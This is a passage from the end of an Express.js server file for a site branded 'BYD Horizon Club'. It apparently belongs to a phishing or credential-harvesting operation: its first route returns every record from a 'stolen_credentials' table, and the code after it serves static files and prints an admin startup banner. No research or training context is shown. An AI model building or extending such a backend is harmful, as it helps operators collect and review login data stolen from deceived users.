  res.json(await db.all("SELECT * FROM stolen_credentials ORDER BY id DESC"));
});

// ==================== STATIC FILES ====================

const distPath = path.join(process.cwd(), "dist");
app.use(express.static(distPath));

app.get("*", async (req, res) => {
  if (req.path.startsWith("/api/")) return res.status(404).json({ error: "API endpoint not found." });
  try {
    const indexPath = path.join(distPath, "index.html");
    if (fs.existsSync(indexPath)) {
      res.sendFile(indexPath);
    } else {
      // Dev mode: let vite handle it
      res.status(200).send("BYD Horizon Club - Server running. Run 'npm run build' for production or use dev mode.");
    }
  } catch {
    res.status(200).send("BYD Horizon Club Server Active");
  }
});

// ==================== START ====================

async function startServer() {
  await getDb(); // Initialize database
  app.listen(PORT, () => {
    console.log(`\n\x1b[36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m`);
    console.log(`\x1b[36m  ⚡ BYD HORIZON CLUB SERVER ACTIVE\x1b[0m`);
    console.log(`\x1b[36m  🌐 http://localhost:${PORT}\x1b[0m`);
    console.log(`\x1b[36m  👑 Admin: ${ADMIN_EMAIL}\x1b[0m`);
    console.log(`\x1b[36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n`);
  });
}

startServer();
